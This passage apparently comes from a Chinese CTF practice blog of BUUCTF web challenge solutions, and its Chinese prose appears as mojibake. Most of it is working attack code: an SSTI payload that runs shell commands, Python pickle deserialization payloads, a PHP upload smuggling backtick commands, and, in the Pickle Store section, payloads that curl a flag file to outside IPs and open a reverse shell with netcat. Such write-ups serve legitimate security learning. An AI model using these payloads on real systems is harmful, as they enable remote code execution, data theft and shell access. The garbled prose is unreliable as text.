<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;cat flasklight/coomme_geeeett_youur_flek&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store
</h2><p>ä¼ªé€ cookieï¼Œbase64ç¼–ç å¾—flag</p>
<h2 id="wustctf2020cv-maker">[WUSTCTF2020]CV Maker
</h2><p>æ³¨å†Œç™»å…¥ï¼Œbpæ”¹ä¸ºå›¾ç‰‡æ ¼å¼</p>
<p>ä¸Šä¼ èšå‰‘è¿æ¥</p>
<h2 id="ciscn2019-ååŒ—èµ›åŒº-day1-web2ikun">[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun
</h2><p>ä¸Šæ¥æç¤ºçˆ†ç ´ç½‘ç«™ï¼Œè¦ä¹°åˆ°lv6,æˆ‘ä»¬ç‚¹å¼€lv4çš„å›æ˜¾å‚æ•°page,çˆ†ç ´page</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span> <span class="n">url</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;lv6.png&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çˆ†ç ´å‡º181</p>
<p>æŠ“åŒ…æ”¹æŠ˜æ‰£</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224195956481.png"
	width="1815"
	height="725"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224195956481_hu18088761822422462305.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250224195956481_hu9922544820779111799.png 1024w"
	loading="lazy"
	
		alt="image-20250224195956481"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="600px"
	
></p>
<p>å¾—åˆ°/b1g_m4mberè·¯ç”±,jwtä¼ªé€ ï¼Œkeyæ˜¯1Kun</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224200957244.png"
	width="991"
	height="61"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224200957244_hu13541195208454464377.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250224200957244_hu11066851182009614471.png 1024w"
	loading="lazy"
	
		alt="image-20250224200957244"
	
	
		class="gallery-image" 
		data-flex-grow="1624"
		data-flex-basis="3899px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224201145799.png"
	width="1445"
	height="635"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224201145799_hu1422554894552198780.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250224201145799_hu12249293639242158175.png 1024w"
	loading="lazy"
	
		alt="image-20250224201145799"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="546px"
	
></p>
<p>æŸ¥çœ‹æºç åé¢èƒ½ä¸‹è½½æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tornado.web</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sshop.base</span> <span class="kn">import</span> <span class="n">BaseHandler</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">AdminHandler</span><span class="p">(</span><span class="n">BaseHandler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@tornado.web.authenticated</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_user</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;form.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="s1">&#39;This is Black Technology!&#39;</span><span class="p">,</span> <span class="n">member</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;no_ass.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@tornado.web.authenticated</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">become</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;become&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">become</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;form.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">member</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;form.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="s1">&#39;This is Black Technology!&#39;</span><span class="p">,</span> <span class="n">member</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">become</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œpickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚ç”¨åˆ°ååºåˆ—åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="p">[,</span><span class="n">protocol</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="err">å‡½æ•°çš„åŠŸèƒ½ï¼šå°†</span><span class="n">objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="err">å‚æ•°è®²è§£ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="err">ï¼šæƒ³è¦åºåˆ—åŒ–çš„</span><span class="n">objå¯¹è±¡</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="p">:</span><span class="err">æ–‡ä»¶åç§°ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">protocol</span><span class="err">ï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º</span><span class="mi">0</span><span class="err">ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–</span><span class="n">HIGHEST_PROTOCOL</span><span class="err">ï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">å‡½æ•°çš„åŠŸèƒ½ï¼šå°†</span><span class="n">fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡º</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="err">å‚æ•°è®²è§£ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="err">ï¼šæ–‡ä»¶åç§°ã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">obj</span><span class="p">[,</span> <span class="n">protocol</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="err">å‡½æ•°çš„åŠŸèƒ½ï¼šå°†</span><span class="n">objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼</span><span class="err">ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="err">å‚æ•°è®²è§£ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="err">ï¼šæƒ³è¦åºåˆ—åŒ–çš„</span><span class="n">objå¯¹è±¡</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="n">protocal</span><span class="err">ï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º</span><span class="mi">0</span><span class="err">ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–</span><span class="n">HIGHEST_PROTOCOL</span><span class="err">ï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">å‡½æ•°çš„åŠŸèƒ½ï¼šä»</span><span class="n">stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡</span><span class="err">ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="err">å‚æ•°è®²è§£ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="err">ï¼šæ–‡ä»¶åç§°ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="err">ã€æ³¨ã€‘</span> <span class="n">dump</span><span class="p">()</span> <span class="err">ä¸</span> <span class="nb">load</span><span class="p">()</span> <span class="err">ç›¸æ¯”</span> <span class="n">dumps</span><span class="p">()</span> <span class="err">å’Œ</span> <span class="n">loads</span><span class="p">()</span> <span class="err">è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼š</span><span class="n">dump</span><span class="p">()</span><span class="err">å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨</span><span class="nb">load</span><span class="p">()</span><span class="err">æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨</span><span class="n">__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag</span><span class="o">.</span><span class="n">txtæ–‡ä»¶</span><span class="err">ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡Œ</span><span class="n">URLç¼–ç </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼šå…¨å±€æœç´¢</span><span class="n">Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼</span><span class="err">â€œ</span><span class="n">import</span> <span class="n">cPickle</span><span class="err">â€æˆ–â€œ</span><span class="n">import</span> <span class="n">pickle</span><span class="err">â€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨</span><span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">()</span><span class="err">æˆ–</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">()</span><span class="err">ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦åœ¨py2ç¯å¢ƒç”¨</p>
<p>ä¸‹é¢è¿™ä¸ªæ˜¯py3çš„è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">commands</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">commands</span><span class="o">.</span><span class="n">getoutput</span><span class="p">,(</span><span class="s1">&#39;ls /&#39;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">payload</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åcat /flag.txt</p>
<h2 id="çº¢æ˜è°·ctf-2021write_shell">[çº¢æ˜è°·CTF 2021]write_shell
</h2><p>actionä¼ pwd,çœ‹ç›®å½•</p>
<p>sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">data</span><span class="o">=&lt;</span><span class="err">?</span><span class="o">=%</span><span class="mi">09</span><span class="err">`</span><span class="n">ls</span><span class="o">%</span><span class="mi">09</span><span class="o">/</span><span class="err">`?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">data</span><span class="o">=&lt;</span><span class="err">?</span><span class="o">=%</span><span class="mi">09</span><span class="err">`</span><span class="n">cat</span><span class="o">%</span><span class="mi">09</span><span class="o">/</span><span class="n">flllllll1112222222lag</span><span class="err">`?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>%09-&gt;ç©ºæ ¼ï¼Œåå¼•å·å¯ä»¥æ‰§è¡Œshellå‘½ä»¤</p>
<h2 id="watevrctf-2019pickle-store">[watevrCTF-2019]Pickle Store
</h2><p>æŠ“åŒ…æ‹¿cookie</p>
<p>ä¸€ä¸²base64ï¼Œé¢˜ç›®æç¤ºpickle,è§£ç åååºåˆ—åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#39;money&#39;: 500, &#39;history&#39;: [], &#39;anti_tamper_hmac&#39;: &#39;aa1ba4de55048cf20e0a7a63b7f8eb62&#39;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯è§å…¶ä¸­å¸¦ä¸Šäº†hmacéªŒè¯ã€‚</p>
<p>æ¥ä¸‹æ¥æœ€ç®€å•çš„æ˜¯ç›´æ¥å¼¹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;curl -d @flag.txt 174.0.157.204:2333&#39;)&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;curl http://119.xxx.xxx.xxx/`cat flag.txt|base64`&#39;)&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;nc 119.29.60.71 9999 -e/bin/sh&#39;)&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…cookieä¼ªé€ </p>
<p>é¦–å…ˆååºåˆ—åŒ–çš„pickleæµä¸­åŒ…å«äº†ç»™keyèµ‹å€¼çš„æ“ä½œï¼Œååºåˆ—åŒ–åkeyå€¼ä¼šè¢«è¦†ç›–</p>
<div class="highlight"><div class="chroma">
